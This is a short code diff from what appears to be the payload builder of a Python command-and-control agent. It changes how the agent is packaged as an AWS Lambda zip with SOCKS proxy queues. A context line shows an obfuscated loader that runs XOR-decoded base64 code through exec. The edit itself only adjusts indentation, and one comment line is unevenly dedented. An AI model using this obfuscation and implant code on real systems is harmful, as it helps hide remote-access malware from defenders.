@@ -183,12 +183,13 @@ exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encod
                 resp.payload = base64.b64encode(base_code.encode())
                 resp.build_message = "Successfully Built"
             elif self.get_parameter("output") == "lambda_zip":
-                # Find the start of __init__ function and truncate
+            # Find the start of __init__ function and truncate
                 init_start = base_code.find("def __init__(self):")
                 base_code = base_code[:init_start]
                 
-                # Add our Lambda implementation
-                base_code += """    self.socks_open = {}
+                # Add our Lambda implementation with proper indentation
+                base_code += """    def __init__(self):
+                    self.socks_open = {}
                     self.socks_in = queue.Queue()
                     self.socks_out = queue.Queue()
                     self.taskings = []
